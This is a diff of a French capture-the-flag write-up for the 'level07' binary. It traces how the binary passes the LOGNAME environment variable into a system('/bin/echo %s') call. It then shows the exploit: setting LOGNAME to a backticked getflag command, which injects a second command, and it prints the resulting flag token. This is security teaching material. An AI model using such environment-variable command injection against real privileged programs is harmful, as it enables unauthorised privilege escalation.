@@ -68,9 +68,9 @@ RAS
 ```
 - On repère la fonction asprintf qui semble print le nom du fichier
 - On voit un getenv
+- Pour mieux comprendre on fait un ltrace qui trace les appels aux librairies du binaire
 
-`ltrace ./level07`
-result:
+`ltrace ./level07` result:
 ```
 __libc_start_main(0x8048514, 1, 0xbffff6f4, 0x80485b0, 0x8048620 <unfinished ...>
 getegid()                                                 = 2007
@@ -85,15 +85,28 @@ system("/bin/echo level07 "level07
 <... system resumed> )                                    = 0
 +++ exited (status 0) +++
 ```
-- On repère un appelle de variable d'env "LOGNAME"
-- On veut réécrire LOGENV afin d'influer sur la comande echo
-`strings ./level07 | grep %`
-result:
+
+On repère un appelle de variable d'env "LOGNAME" suivi d'un call `system()` ou on aimerai injecter du code
+
+```python
+getenv("LOGNAME") = "level07"
+system("/bin/echo level07 ")
+```
+
+Avec un peu de chance le `level07` de l'appel systeme `bin/echo level07` vient de la variable logname. verifions cela:  
+
+```bash
+strings ./level07 | grep %s
 /bin/echo %s
+```
+
+On remplace `LOGNAME` par `getflag` (backticks) pour run `/bin/echo 'getflag'`
 
 ```bash
 export LOGNAME="\`getflag\`"
 ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 ```
-result:
-`Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`
+
+Tadaaa !
+
